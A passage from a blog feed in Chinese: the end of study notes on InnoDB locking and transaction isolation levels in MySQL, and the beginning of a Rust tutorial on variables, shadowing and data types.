条件的这一部分下推到存储引擎，在那里使用索引对其进行评估。如果没有找到匹配的记录，则避免进行聚集索引查找。如果找到匹配的记录，即使在标记为删除的记录中，InnoDB 也会在聚集索引中查找该记录。</p><h2 id="InnoDB-锁机制"><a href="#InnoDB-锁机制" class="headerlink" title="InnoDB 锁机制"></a>InnoDB 锁机制</h2><p>由于 MySQL 是一个多用户数据库，需要最大程度的利用数据库的并发访问，并确保不同用户之间的操作不会冲突和干扰，因此需要有一种机制来完成这个任务，即锁机制（Locking）。一言以蔽之，<strong>锁机制用于管理对共享资源的并发访问</strong>。</p><blockquote><p>注意：须知锁机制并不只是用于行记录，在数据库内部的很多地方都有锁的使用，如保证缓冲池数据一致性的锁。</p></blockquote><h3 id="Lock-与-Latch"><a href="#Lock-与-Latch" class="headerlink" title="Lock 与 Latch"></a>Lock 与 Latch</h3><p>在数据库中常常见到 lock 和 latch 两种锁，后者一般称其为闩锁（轻量级的锁），因为它要求锁定的时间必须非常短。在 InnoDB 中，latch 可以分为 mutex（互斥锁） 和 rwlock（读写锁），用于保证并发线程操作临界资源的正确性，通常没有死锁检测机制。</p><p>lock 的对象是事务，它用于锁定数据库中的如表、页、行等对象。lock 通常在事务 <code>COMMIT</code> 或 <code>ROLLBACK</code> 后释放，并存在死锁检测和处理的机制。</p><blockquote><p>通过 <code>SHOW ENGINE InnoDB MUTEX;</code> 语句可以查看 latch 的相关信息：</p><pre><code class="mysql">mysql&gt; show engine innodb mutex;+--------+------------------------+---------+| Type   | Name                   | Status  |+--------+------------------------+---------+| InnoDB | rwlock: log0log.cc:846 | waits=2 |+--------+------------------------+---------+1 row in set (0.00 sec)</code></pre></blockquote><h3 id="InnoDB-中的锁"><a href="#InnoDB-中的锁" class="headerlink" title="InnoDB 中的锁"></a>InnoDB 中的锁</h3><p>InnoDB 中有以下几种锁：</p><ul><li>共享锁（Shared Locks）</li><li>排他锁（Exclusive Locks）</li><li>意向锁（Intent Locks）</li><li>记录锁（Record Locks）</li><li>间隙锁（Gap Locks）</li><li>Next-Key Locks</li><li>插入意向锁（Insert Intention Locks）*</li><li>自增锁（AUTO-INC Locks）*</li><li>空间索引的谓词锁（Predicate Locks for Spatial Indexes）*</li></ul><h3 id="共享锁和排他锁"><a href="#共享锁和排他锁" class="headerlink" title="共享锁和排他锁"></a>共享锁和排他锁</h3><p>InnoDB 实现了两个标准的行级锁：共享锁（S 锁）和排他锁（X 锁）：</p><ul><li>S 锁允许持有锁的事务读取行。</li><li>X 锁允许持有锁的事务更新或删除行。</li></ul><p>如果事务 T1 在行 r 上持有共享锁，那么来自某个不同事务 T2 的请求在行 r 上的锁将按如下方式处理：</p><ul><li>T2 对 S 锁的请求可以立即被批准。结果，T1 和 T2 都在 r 上保持 S 锁，这种情况被称为锁兼容（lock compatible）。</li><li>T2 对 X 锁的请求不能立即被批准。</li></ul><p>如果事务 T1 在行 r 上持有排他锁，则无法立即授予某个不同事务 T2 请求的 r 上任何一种类型的锁。事务 T2 必须等待事务 T1 释放对行 r 的锁。</p><h3 id="意向锁"><a href="#意向锁" class="headerlink" title="意向锁"></a>意向锁</h3><p>InnoDB 支持<strong>多粒度锁定</strong>（<em>multiple granularity locking</em>），允许行锁和表锁共存。为了支持多粒度级别的锁定，InnoDB 使用意向锁。意向锁是表级锁，指示事务稍后需要对表中的行使用哪种类型的锁（共享锁或独占锁）。</p><p>意向锁有两种类型：</p><ul><li>意向共享锁（IS）表示事务打算在表中的各个行上设置共享锁。</li><li>意向排他锁（IX）表示事务打算对表中的各个行设置排他锁。</li></ul><p>例如，<code>SELECT ... LOCK IN SHARE MODE</code> 设置一个 IS 锁，而 <code>SELECT ... FOR UPDATE</code> 设置一个 IX 锁。</p><p>意向锁的协议如下：</p><ul><li>在事务获得表中某行的共享锁之前，它必须首先获得表上的 IS 锁或更强的锁。</li><li>在事务获得表中某行的排他锁之前，它必须首先获得表上的 IX 锁。</li></ul><p>表级锁类型的兼容性总结在下表（Compatible 兼容，Conflict 冲突）：</p><table><thead><tr><th align="center"></th><th align="center">X</th><th align="center">IX</th><th align="center">S</th><th align="center">IS</th></tr></thead><tbody><tr><td align="center">X</td><td align="center">Conflict</td><td align="center">Conflict</td><td align="center">Conflict</td><td align="center">Conflict</td></tr><tr><td align="center">IX</td><td align="center">Conflict</td><td align="center">Compatible</td><td align="center">Conflict</td><td align="center">Compatible</td></tr><tr><td align="center">S</td><td align="center">Conflict</td><td align="center">Conflict</td><td align="center">Compatible</td><td align="center">Compatible</td></tr><tr><td align="center">IS</td><td align="center">Conflict</td><td align="center">Compatible</td><td align="center">Compatible</td><td align="center">Compatible</td></tr></tbody></table><p>如果请求事务与现有锁兼容，则向请求事务授予锁。如冲突则不会授予，事务要一直等到现有锁被释放。如果锁请求与现有锁冲突并且由于会导致死锁而无法授予，则会发生错误。</p><p>除了全表请求（如 <code>LOCK TABLES ... WRITE</code>）之外，意向锁不会阻塞任何东西。意向锁的主要目的是表明有人<strong>正在</strong>或<strong>打算</strong>锁定表中的一行。</p><p>意向锁的事务数据在 <code>SHOW ENGINE INNODB STATUS</code> 和 InnoDB 监视器（InnoDB monitor）输出中显示类似于以下内容：</p><pre><code class="sql">TABLE LOCK table `test`.`t` trx id 10080 lock mode IX</code></pre><h3 id="记录锁"><a href="#记录锁" class="headerlink" title="记录锁"></a>记录锁</h3><p>记录锁是对索引记录的锁。例如，<code>SELECT c1 FROM t WHERE c1 = 10 FOR UPDATE;</code> 阻止任何其他事务插入、更新或删除 <code>t.c1</code> 值为 10 的行。</p><p>记录锁总是会锁定索引记录，即使一个表没有定义索引（这里指的是没有手动定义索引）。对于这种情况，InnoDB 会创建一个隐藏的聚集索引并使用该索引进行记录锁定（参见聚集索引相关部分）。</p><p>记录锁的事务数据在 <code>SHOW ENGINE INNODB STATUS</code> 和 InnoDB 监视器（InnoDB monitor）输出中显示类似于以下内容：</p><pre><code class="sql">RECORD LOCKS space id 58 page no 3 n bits 72 index `PRIMARY` of table `test`.`t`trx id 10078 lock_mode X locks rec but not gapRecord lock, heap no 2 PHYSICAL RECORD: n_fields 3; compact format; info bits 0 0: len 4; hex 8000000a; asc     ;; 1: len 6; hex 00000000274f; asc     &#39;O;; 2: len 7; hex b60000019d0110; asc        ;;</code></pre><h3 id="间隙锁"><a href="#间隙锁" class="headerlink" title="间隙锁"></a>间隙锁</h3><p>间隙锁是对索引记录之间的间隙的锁，或者是对第一个索引记录之前或最后一个索引记录之后的间隙的锁。例如，<code>SELECT c1 FROM t WHERE c1 BETWEEN 10 and 20 FOR UPDATE;</code> 能够防止其他事务将 15 的值插入到列 <code>t.c1</code> 中，无论该列中是否已经存在任何此类值，因为该范围内所有现有值之间的间隙已被锁定。</p><p>间隙（gap）可能跨越单个索引值、多个索引值，甚至是空的。</p><p>间隙锁是性能和并发性之间权衡的一部分，用于部分特定的事务隔离级别。</p><p>锁定使用唯一索引（unique）行的语句不需要间隙锁。（这不包括搜索条件只包含多列唯一索引的部分列的情况；在这种情况下，确实会发生间隙锁定。）例如，如果 id 列具有唯一索引，则以下语句仅使用id 值为 100 的行的索引记录锁，其他会话是否在前面的间隙中插入行无关紧要：</p><pre><code class="mysql">SELECT * FROM child WHERE id = 100;</code></pre><h3 id="一致性非锁定读"><a href="#一致性非锁定读" class="headerlink" title="一致性非锁定读"></a>一致性非锁定读</h3><p>一致性非锁定读（Consistent Nonlocking Read）指的是 InnoDB 通过 Multi-Versioning 机制来读取当前执行时间数据库中的行数据。如果要读取的行正在进行 <code>DELETE</code> 或 <code>UPDATE</code> 操作，这时读取操作不会去等待行锁的释放，而是去读取该行的一个快照数据。</p><p>快照数据指的是该行之前版本的数据，这是由 undo 段实现的。undo 被用来在事务中回滚数据，因此快照数据本身是原本就必须的开销，并非额外开销。此外读取快照数据也不需要上锁，因为其不会被修改。</p><h3 id="Phantom-Problem"><a href="#Phantom-Problem" class="headerlink" title="Phantom Problem"></a>Phantom Problem</h3><p>Phantom Problem 即幻像问题，指的是在同一个事务下，连续执行两次相同的 SQL 语句可能导致不同的结果，第二次的语句可能会返回之前不存在的行。例如，如果一个 <code>SELECT</code> 语句执行了两次，但第二次返回了第一次未返回的行，则该行是“幻”行。</p><p>假设表 <code>tbl_test</code> 的 <code>id</code> 列上有一个索引，并且你希望读取并锁定表中 <code>id</code> 大于 100 的所有行，以便稍后更新选定行中的某些列：</p><pre><code class="mysql">SELECT * FROM tbl_test WHERE id &gt; 100 FOR UPDATE;</code></pre><p>查询从索引中 <code>id</code> 大于 100 的第一条记录开始扫描，假如表中包含 <code>id</code> 值为 90 和 102 的行。如果没有对扫描范围内记录间的间隙（在本例中，间隙在 90 和 102 之间）加锁，那么另一个会话可以在表中插入 <code>id</code> 为 101 的新行。如果要在同一事务中执行相同的 <code>SELECT</code>，则会在查询返回的结果集中看到一个 <code>id</code> 为 101 的新行（幻行）。如果我们将查询的行集合视为一个数据项，那么新出现的幻行将违反事务读取的数据在事务期间不会更改的隔离原则。</p><p>为了防止出现幻像现象，InnoDB 使用了一种称为 Next-Key 锁的算法，该算法将<strong>索引行锁</strong>与<strong>间隙锁</strong>相结合。InnoDB 加行级的方式是，当它搜索（search）或扫描（scan）表索引时，它会在遇到的索引记录上设置共享锁或排他锁。因此，行级锁（row-level locks）实际上就是索引记录锁（index-record locks）。此外，索引记录上的 Next-Key 锁会影响索引记录之前的“间隙”，它是一个索引记录锁加上一个在索引记录之前的间隙上的间隙锁。如果一个会话对索引中的记录 R 拥有共享锁或排他锁，则另一个会话不能在索引中顺序紧靠 R 之前的间隙中插入新的索引记录。比如上面的 SQL 语句，锁住的不单单是表中的 102，它为 $(2,+\infin)$ 的一整个范围加了 X 锁。</p><p>InnoDB 扫描索引时，也可以锁定索引中最后一条记录后的间隙。在前面的示例中就是这样：为了防止其他会话在 <code>id</code> 大于 100 的表中进行任何插入行为，InnoDB 设置的锁包括对 <code>id</code> 值为 102 之后间隙的锁。</p><p>可以使用 Next-Key 锁在应用程序中实现唯一性检查：如果在共享模式（share mode）下读取数据并且没有看到你要插入行的重复项，那么你可以安全地插入该行，因为在读取期间在你将插入行的后面上设置的 Next-Key 锁可防止任何人同时插入重复项。因此，Next-Key 锁能够“锁定”表中还不存在的内容。</p><p>当然用户可以禁用间隙锁，但这可能会导致幻像问题，因为当禁用间隙锁时，其他会话可以将新行插入间隙中。</p><blockquote><p>在 InnoDB 默认的隔离级别（可重复读）下，InnoDB 通过上述的 Next-Key 锁机制来避免幻像问题，而在其他很多数据库中，只有在串行隔离级别下才能解决幻像问题。</p></blockquote><h3 id="锁问题"><a href="#锁问题" class="headerlink" title="锁问题"></a>锁问题</h3><p>通过锁机制可以实现事务的隔离性要求，满足事务的并发需求，但存在三种可能遇到的锁问题，即脏读、不可重复读、</p><h4 id="脏读"><a href="#脏读" class="headerlink" title="脏读"></a>脏读</h4><p>脏读（Dirty Read）的脏指的是脏数据，和脏页不同。脏页指的是在缓冲池中已经被修改，但未持久化到磁盘，从而暂时数据不一致的页。脏数据指的是事务对缓冲池中<strong>行记录</strong>的修改，并且还未被提交。因此一旦脏数据被其他事务读到了，直接就违反了事务的隔离性。而脏读顾名思义就是指读到了这些脏数据。</p><h4 id="不可重复读"><a href="#不可重复读" class="headerlink" title="不可重复读"></a>不可重复读</h4><p>不可重复读简单来说就是事务 A 对同一数据集进行了多次读操作，然而事务 B 在 A 还未结束时就对这个集合中的某些数据进行了修改<strong>并且成功提交了</strong>，导致 A 多次读到的数据是不一致的。这和脏读的区别就在于脏读读到的是还未提交的数据，而不可重复读读到的是已经提交了的数据。</p><blockquote><p>在很多场景下，因为读到的是已经提交的数据，不可重复读并不算大问题。很多数据库厂商的解决方案中，默认的隔离级别下允许不可重复读的发生。而 InnoDB 把不可重复读现象当作前面提到的幻像问题（Phantom Problem）来处理，默认的隔离级别下通过 Next-Key 锁算法来避免不可重复读问题 。</p></blockquote><h4 id="幻读"><a href="#幻读" class="headerlink" title="幻读"></a>幻读</h4><p>幻读与不可重复读很类似，容易混淆。事务 A 对同一数据集进行了多次读操作，然而事务 B 在 A 还未结束时就对这个集合中的某些数据进行了<strong>新增或删除</strong>。因此二者的区别就在于不可重复读侧重于对数据的修改，而幻读侧重于对数据的新增或删除。</p><h4 id="丢失更新"><a href="#丢失更新" class="headerlink" title="丢失更新"></a>丢失更新</h4><h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><h3 id="锁升级"><a href="#锁升级" class="headerlink" title="锁升级"></a>锁升级</h3><h2 id="InnoDB-事务"><a href="#InnoDB-事务" class="headerlink" title="InnoDB 事务"></a>InnoDB 事务</h2><p>InnoDB 事务模型旨在将多版本数据库的最佳特性与传统的两阶段锁定相结合。InnoDB 在行级别执行锁定，并在默认情况下以 Oracle 样式以非锁定一致读取的方式运行查询。InnoDB 中的锁信息有效地存储在空间中，因此不需要锁升级。通常，允许多个用户锁定 InnoDB 表中的每一行或任意行的子集，而不会导致 InnoDB 内存耗尽。</p><p>InnoDB 中的事务完全符合 ACID 模型，事务主要实现其中的原子性（atomicity）和隔离性（isolation）。InnoDB 事务实现 ACID 的具体体现可以在 <a href="#InnoDB-ACID-%E6%A8%A1%E5%9E%8B">InnoDB ACID 模型</a> 一节中找到。</p><p>InnoDB 的事务执行有以下几种状态：</p><ul><li>Active（活跃）</li><li>Failed（失败）</li><li>Aborted（中止）</li><li>Partially Committed（部分已提交）</li><li>Commmitted（已提交）</li></ul><h3 id="事务的实现"><a href="#事务的实现" class="headerlink" title="事务的实现"></a>事务的实现</h3><p>事务的隔离性由锁机制实现，其他三个特性由 redo log 以及 undo log 实现。其中，redo log 用来保证事务的原子性和持久性。undo log 用于保证事务的一致性。</p><h4 id="redo"><a href="#redo" class="headerlink" title="redo"></a>redo</h4><p>在前面展示的 <a href="#InnoDB-%E6%9E%B6%E6%9E%84">InnoDB 架构</a>中可以看到，redo log 由内存中的 Log Buffer 以及磁盘上的 Redo Log 文件组成。前者易失，后者持久。</p><blockquote><p>这里使用了 WAL（Write-Ahead Logging，先记日志再写入）。</p></blockquote><p>通过 redo log 保证了 <strong><em>Crash-Safe</em></strong>。</p><h4 id="undo"><a href="#undo" class="headerlink" title="undo"></a>undo</h4><h3 id="事务的隔离级别"><a href="#事务的隔离级别" class="headerlink" title="事务的隔离级别"></a>事务的隔离级别</h3><p>事务的隔离属于数据库处理基础之一，属于 ACID 中的 “I”。然而大多数数据库系统都没有提供真正的隔离性，因为要实现严格的隔离要付出很多额外的开销。因此，在性能和正确性之间，数据库实现都进行了部分妥协来达到一种平衡。隔离级别就是隔离性的一种等级划分。</p><p>InnoDB 事务有四个隔离级别（SQL 标准定义），由低到高分别如下：</p><ul><li>读未提交（READ UNCOMMITTED）</li><li>读已提交（READ COMMITTED）</li><li>可重复读（REPEATABLE READ）</li><li>串行化（SERIALIZABLE）</li></ul><p>其中，<strong>可重复读是 InnoDB 默认的隔离级别</strong>。隔离级别越低，事务请求的锁越少或者其保持锁的时间就越短，这也就是为什么大多数数据库系统的默认隔离级别是<strong>读已提交</strong>。实际上，在 InnoDB 中，可重复读和读已提交之间的性能差距并不大，甚至它们和串行化级别的差距也不一定很大。</p><p>通过 <code>SELECT @@tx_isolation\G;</code> 语句可以查询当前连接（会话）的事务隔离级别，通过 <code>SELECT @@global.tx_isolation\G;</code> 可以查询全局的事务隔离级别。用户可以使用 <code>SET TRANSACTION</code> 语句自行修改单个会话及其后续连接的隔离级别（这涉及到 MySQL 连接的问题）。要为所有连接设置默认的隔离级别，可配置 <code>--transaction-isolation</code> 选项。</p><p>下面的列表描述了 MySQL 如何支持不同的事务级别。列表从最<strong>常用</strong>的级别到最<strong>不常用</strong>的级别。</p><h4 id="REPEATABLE-READ"><a href="#REPEATABLE-READ" class="headerlink" title="REPEATABLE READ"></a>REPEATABLE READ</h4><blockquote><p>与 SQL 标准隔离级别不同，InnoDB 借由 MVCC 以及 Next-Key 锁实现的可重复读级别<strong>能够避免幻读的发生</strong>，这与其他数据库系统完全不同。因此，可以说 InnoDB 的可重复读级别已经达到了 SQL 标准的串行化（SERIALIZABLE）级别。然而很多不经考证的资料中都混淆了 ANSI SQL 标准的隔离级别和 InnoDB 实现的隔离级别，前者的可重复读是没有解决幻读的。</p></blockquote><p>在<strong>可重复读</strong>级别下，同一事务的一致性读是由第一次读取所建立的快照。也就是说，在同一事务中的多个普通 <code>SELECT</code>（非锁定）语句彼此之间是一致的。</p><p>而对于锁定读取（带有 <code>FOR UPDATE</code> 的 <code>SELECT</code> 或 <code>LOCK IN SHARE MODE</code>）、UPDATE 和 DELETE 语句，锁（locking）取决于该语句是使用具有<strong>唯一搜索条件</strong>（<em>unique search condition</em>）还是<strong>范围类型搜索条件</strong>（<em>range-type search condition</em>）的唯一索引（unique index）：</p><ul><li>对于具有唯一搜索条件的唯一索引，InnoDB 只锁定找到的索引记录，而不锁定它之前的间隙。</li><li>对于其他的搜索条件，InnoDB 锁定扫描范围内的所有记录，使用间隙锁和 Next-Key 锁来阻止其他会话对该锁定范围的插入操作。</li></ul><h4 id="READ-COMMITTED"><a href="#READ-COMMITTED" class="headerlink" title="READ COMMITTED"></a>READ COMMITTED</h4><p>在<strong>读已提交</strong>级别下，每个要求读一致性的操作，即使在同一个事务中也会设置和读取自己的新快照。</p><p>对于锁定读取（<code>SELECT with FOR UPDATE</code> 或 <code>LOCK IN SHARE MODE</code>）、<code>UPDATE</code> 语句和 <code>DELETE</code> 语句，InnoDB 仅锁定索引记录，而不是它们之前的间隙，因此允许在锁定的记录旁边自由插入新记录。在这个级别下，间隙锁仅用于外键约束检查和重复键检查。</p><blockquote><p>该级别下<strong>已经解决了脏读问题</strong>，但由于间隙锁被禁用，可能会出现幻读问题，因为其他会话可以将新行插入间隙中。</p></blockquote><p>READ COMMITTED 隔离级别仅支持基于行的二进制日志记录。如果使用 READ COMMITTED 隔离级别并且开启 <code>binlog_format=MIXED</code>，服务器会自动使用基于行的日志记录。</p><h4 id="READ-UNCOMMITTED"><a href="#READ-UNCOMMITTED" class="headerlink" title="READ UNCOMMITTED"></a>READ UNCOMMITTED</h4><p><code>SELECT</code> 语句以非锁定方式执行，可能会读到行的早期版本，因此使用该隔离级别会导致脏读问题。这个隔离级别很少在实际中使用，因为它的性能也并没有好多少。</p><h4 id="SERIALIZABLE"><a href="#SERIALIZABLE" class="headerlink" title="SERIALIZABLE"></a>SERIALIZABLE</h4><p>此级别类似于 <strong>REPEATABLE READ</strong>，但如果 <code>autocommit</code>（自动提交）被禁用（设置为 <code>disabled</code>），InnoDB 隐式地将所有普通 <code>SELECT</code> 语句转换为 <code>SELECT ... LOCK IN SHARE MODE</code>，即为所有的读操作都加一个共享锁。如果启用了自动提交，则一条 <code>SELECT</code> 语句就是一个事务。因此，已知当前的场景是只读的，并且要求一致性（非阻塞）读，另外不需要阻塞其他事务，则可以使用串行化级别。</p><blockquote><p>如果其他事务修改了选定的行，要强制让普通的 <code>SELECT</code> 语句阻塞其他事务的修改，请禁用自动提交来为每一个读操作都加锁。</p></blockquote><h3 id="autocommit、Commit-和-Rollback"><a href="#autocommit、Commit-和-Rollback" class="headerlink" title="autocommit、Commit 和 Rollback"></a>autocommit、Commit 和 Rollback</h3><p>在 InnoDB 中，所有的用户活动都发生在一个事务中。如果启用了 autocommit（自动提交）模式，则每个 SQL 语句都会单独形成一个事务。默认情况下，MySQL 为每个新客户端连接启动带有 autocommit 的会话（session）。因此如果一条 SQL 语句没有返回错误，MySQL 会在其后进行提交。如果该语句返回了错误，则根据这个错误来决定进行提交或回滚。</p><p>启用了 autocommit 的会话可以通过显式的 <code>START TRANSACTION</code> 或 <code>BEGIN</code> 语句启动它并以 <code>COMMIT</code> 或 <code>ROLLBACK</code> 语句结束它，以此来执行多语句事务。</p><p>如果在会话中通过 <code>SET autocommit = 0</code> 语句禁用自动提交模式，则会话始终打开一个事务。用 <code>COMMIT</code> 或 <code>ROLLBACK</code> 语句结束当前事务并开始一个新事务。</p><p>如果禁用 autocommit 的会话在没有明确提交最终事务的情况下结束，MySQL 将回滚该事务。</p><p>某些语句隐式地结束了一个事务，就好像用户在执行该语句之前已经完成了 <code>COMMIT</code> 一样。这种情况参见 <a href="https://dev.mysql.com/doc/refman/5.7/en/implicit-commit.html">Statements That Cause an Implicit Commit</a>。</p><p><code>COMMIT</code> 意味着在当前事务中所做的更改是永久的，并且对其他会话可见。而 <code>ROLLBACK</code> 语句取消当前事务所做的所有修改。<code>COMMIT</code> 和 <code>ROLLBACK</code> 都会释放在当前事务期间设置的所有 InnoDB 锁。</p><h3 id="分布式事务"><a href="#分布式事务" class="headerlink" title="分布式事务"></a>分布式事务</h3><h3 id="长事务"><a href="#长事务" class="headerlink" title="长事务"></a>长事务</h3><h2 id="InnoDB-Online-DDL"><a href="#InnoDB-Online-DDL" class="headerlink" title="InnoDB Online DDL"></a>InnoDB Online DDL</h2>]]></content>
    
    
    <summary type="html">&lt;div class=&quot;note quote cyan&quot;&gt;&lt;p&gt;本文是 MySQL InnoDB 存储引擎的相关基础知识总结，主要是对 MySQL 5.7 官方文档 InnoDB 部分进行的翻译和精简，但参考了其他的相关文档（如 MariaDB）以及一些书籍和第三方资料对文章进行补充。本文翻译可能引起歧义的地方都会注明英文原文，以确保不会误导读者。另，本文仅适用于熟悉 MySQL 基本操作以及基本概念的读者。&lt;/p&gt;&lt;/div&gt;</summary>
    
    
    
    <category term="学习笔记" scheme="https://blog.secriy.com/categories/note/"/>
    
    
    <category term="Database" scheme="https://blog.secriy.com/tags/Database/"/>
    
    <category term="MySQL" scheme="https://blog.secriy.com/tags/MySQL/"/>
    
    <category term="InnoDB" scheme="https://blog.secriy.com/tags/InnoDB/"/>
    
  </entry>
  
  <entry>
    <title>Learn Rust</title>
    <link href="https://blog.secriy.com/learn-rust/"/>
    <id>https://blog.secriy.com/learn-rust/</id>
    <published>2021-09-18T06:25:28.000Z</published>
    <updated>2025-02-16T07:13:36.769Z</updated>
    
    <content type="html"><![CDATA[<div class="note quote cyan"><p>本文主要根据 <a href="https://doc.rust-lang.org/book/">The Rust Programming Language</a> 翻译总结而成，大多内容纯粹是对该书的翻译，但按照我个人的学习路线以及练习增删了一些内容，同时也参考了其他文档对需要深入讨论或是难以理解的部分进行了详细介绍，<strong>因此对于本文内容请不要认为其等同于原文</strong>。本文对于<strong>有其他编程语言经验</strong>的同学来说比较容易接受，容易引起歧义的英文翻译都会标注原文。由于本文完全直接参考官方教程等英文文献，可以确保内容不存在由于转经多人之手而出现的偏差。但受限于个人知识水平，难免出现疏漏错误，烦请告知。</p></div><span id="more"></span><h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><blockquote><p>本章没有什么难度，主要是对 Rust 基础概念和用法的学习和适应，无需强行记忆，需要时参考即可，很快能够熟练掌握。</p></blockquote><h3 id="变量和可变性"><a href="#变量和可变性" class="headerlink" title="变量和可变性"></a>变量和可变性</h3><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><p>Rust 中变量有可变变量（<em>mutable variable</em>）和不可变变量（<em>immutable variable</em>）的区分，看如下的代码：</p><pre><code class="rust">fn main() &#123;    let x = 5;    println!(&quot;&#123;&#125;&quot;, x);    x = 6;    println!(&quot;&#123;&#125;&quot;, x);&#125;</code></pre><p>使用 <code>cargo run</code> 运行：</p><pre><code class="shell">$ cargo run   Compiling hello-rust v0.1.0error[E0384]: cannot assign twice to immutable variable `x` --&gt; src\main.rs:4:5  |2 |     let x = 5;  |         -  |         |  |         first assignment to `x`  |         help: consider making this binding mutable: `mut x`3 |     println!(&quot;&#123;&#125;&quot;, x); // 54 |     x = 6;  |     ^^^^^ cannot assign twice to immutable variableerror: aborting due to previous errorFor more information about this error, try `rustc --explain E0384`.error: could not compile `hello-rust`To learn more, run the command again with --verbose.</code></pre><p>上面的错误表明，变量 <code>x</code> 无法二次赋值，因为它是一个 <em>immutable variable</em>。另外报错还说明，Rust 在编译期间就已经对程序可能出现的某些问题作了判断，如果不通过检查则编译失败。</p><pre><code class="rust">fn main() &#123;    let mut x = 5;    println!(&quot;&#123;&#125;&quot;, x); // 5    x = 6;    println!(&quot;&#123;&#125;&quot;, x); // 6&#125;</code></pre><p>通过 <code>let mut x = 5</code> 的方式将 <code>x</code> 初始化为可变变量。</p><p>Rust 特殊的一点在于，变量默认为 <em>immutable</em>，通过添加 <code>mut</code> 来使用 <em>mutable variable</em>，这与其他大多编程语言正相反，可以看出 Rust 强制开发者考虑安全性的设计理念。</p><h4 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h4><p>常量的声明使用如下形式的语句：</p><pre><code class="rust">// const [NAME]: [DATA_TYPE] = [DATA];const PI: f32 = 3.14159;</code></pre><h4 id="差别"><a href="#差别" class="headerlink" title="差别"></a>差别</h4><p>常量和变量有什么差别？</p><ol><li>常量无法使用 <code>mut</code> 修饰，它始终是不可变的；</li><li>常量使用 <code>const</code> 声明，变量使用 <code>let</code>；</li><li>常量必须始终注明其数据类型；</li><li>常量可以在任何范围声明，如全局常量、局部常量；</li><li>常量是通过常量表达式确定值的，在编译期其值就会被确定，而变量的值可以在运行时赋予。</li></ol><h4 id="Shadowing"><a href="#Shadowing" class="headerlink" title="Shadowing"></a>Shadowing</h4><p>Rust 支持使用 <code>let</code> 关键字进行同名变量的重复初始化：</p><pre><code class="rust">fn main() &#123;    let x = 5;    let x = x + 1;    let x = x * 2;    println!(&quot;The value of x is: &#123;&#125;&quot;, x); // The value of x is: 12&#125;</code></pre><p>甚至可以赋值给一个不同类型的同名变量：</p><pre><code class="rust">fn main() &#123;    let string = &quot;abc&quot;;    let string = string.len();    println!(&quot;The length of string is: &#123;&#125;&quot;, string) // The length of string is: 3&#125;</code></pre><p>第一个 <code>string</code> 和第二个 <code>string</code> 并非同一个变量，它们只是同名，不同于 <code>mut</code> 变量，其两个同名变量之间是没有关联的。按 Rust 官方的说法，第一个变量被第二个变量遮蔽（<em>shadowed</em>）了，因此这个概念在 Rust 中叫做 <em>Shadowing</em>。</p><p>如果对 <code>mut</code> 变量赋不同类型的新值：</p><pre><code class="rust">fn main() &#123;    let mut string = &quot;abc&quot;;    string = string.len();    println!(&quot;The length of string is: &#123;&#125;&quot;, string)&#125;</code></pre><p>上面的代码在编译时就无法通过，因为其类型不匹配。</p><p>看下面一段代码，对 <code>mut</code> 变量进行了重新赋值：</p><pre><code class="rust">fn main() &#123;    let mut string = &quot;abc&quot;;    string = &quot;xyz&quot;;    println!(&quot;The string is: &#123;&#125;&quot;, string) // The string is: xyz&#125;</code></pre><p>这段代码能够通过编译，但是编译期间会输出 <code>warning</code>，即警告信息。这是因为 <code>&quot;abc&quot;</code> 字符串并没有使用就被 <code>&quot;xyz&quot;</code> 覆盖了，所以出现警告，但这并不影响程序的运行。</p><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>数据类型是静态类型语言相当重要的部分，Rust 作为一种静态类型语言，其每一个值都有指定的类型，所有变量的类型在编译期间就已经确定了。</p><p>Rust 中数据类型分为两大类：标量类型（scalar）以及复合类型（compound）。</p><h4 id="标量类型"><a href="#标量类型" class="headerlink" title="标量类型"></a>标量类型</h4><p>标量类型是简单类型，代表了单个值。Rust 中有四种标量类型：</p><ul><li>整数</li><li>浮点数</li><li>布尔值</li><li>字符</li></ul><h5 id="整数"><a href="#整数" class="headerlink" title="整数"></a>整数</h5><p>Rust 中的整数类型如下表：</p><table><thead><tr><th align="center">长度（Length）</th><th align="center">有符号（Signed）</th><th align="center">无符号（Unsigned）</th></tr></thead><tbody><tr><td align="center">8-bit</td><td align="center">i8</td><td align="center">u8</td></tr><tr><td align="center">16-bit</td><td align="center">i16</td><td align="center">u16</td></tr><tr><td align="center">32-bit</td><td align="center">i32</td><td align="center">u32</td></tr><tr><td align="center">64-bit</td><td align="center">i64</td><td align="center">u64</td></tr><tr><td align="center">128-bit</td><td align="center">i128</td><td align="center">u128</td></tr><tr><td align="center">arch</td><td align="center">isize</td><td align="center">usize</td></tr></tbody></table><p><code>arch</code> 即 architecture，表示 CPU 架构的位数，如 64-bit 机器上就是 64 bits，32-bit 机器上就是 32 bits，这在其他编程语言里也很常见，如 C 中的<code>int</code>类型。</p><p>整数类型的字面量表示如下表：</p><table><thead><tr><th align="center">字面量（Number literals）</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center">十六进制（Hex）</td><td align="center">0xff</td></tr><tr><td align="center">十进制（Decimal）</td><td align="center">98_222</td></tr><tr><td align="center">八进制（Octal）</td><td align="center">0o77</td></tr><tr><td align="center">二进制（Binary）</td><td align="center">0b1111_0000</td></tr><tr><td align="center">字节（Byte，仅支持 <code>u8</code>）</td><td align="center">b’A’</td></tr></tbody></table><p>Rust 默认使用 <code>i32</code> 初始化整数。</p><h5 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h5><p>Rust 中有 <code>f32</code> 和 <code>f64</code> 两种浮点数类型，分别占用 32 bits 和 64 bits 的大小。Rust 使用 <code>f64</code> 作为浮点数的默认类型，这是因为在现代 CPU 中，64 位浮点数的运算速度和 32 位基本相同，但 64 位浮点数精度更高。</p><p>示例：</p><pre><code class="rust">let x = 1.0;  // f64let y: f32 = 3.0; // f32</code></pre><p>按照 IEEE-754 标准，<code>f32</code> 为单精度浮点数，<code>f64</code> 为双精度浮点数。</p><h5 id="数值运算"><a href="#数值运算" class="headerlink" title="数值运算"></a>数值运算</h5><p>示例：</p><pre><code class="rust">fn main() &#123;    // 加法 addition    let sum = 5 + 10;    // 减法 subtraction    let difference = 95.5 - 4.3;    // 乘法 multiplication    let product = 4 * 30;    // 除法 division    let quotient = 56.7 / 32.2;    // 取余 remainder    let 